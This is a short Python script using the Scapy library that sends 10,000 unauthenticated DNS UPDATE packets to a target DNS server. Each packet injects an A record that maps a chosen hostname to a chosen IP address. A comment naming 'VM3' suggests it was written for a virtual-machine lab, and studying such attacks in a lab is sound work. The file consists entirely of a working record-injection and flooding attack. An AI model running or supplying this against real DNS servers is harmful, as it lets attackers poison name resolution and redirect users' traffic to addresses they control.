from scapy.all import *
import sys

interface = sys.argv[1]
dns_server = sys.argv[2]  #DNS_IP(VM3)

hostname_ip = sys.argv[3]
hostname = sys.argv[4]

target = dns_server

for i in range(10000):
    add_packet = sr1(IP(dst=dns_server)/UDP()/DNS( opcode=5,   ns=[DNSRR(rrname=hostname,  type="A", ttl=120, rdata=hostname_ip)]))
    print (add_packet[DNS].summary())
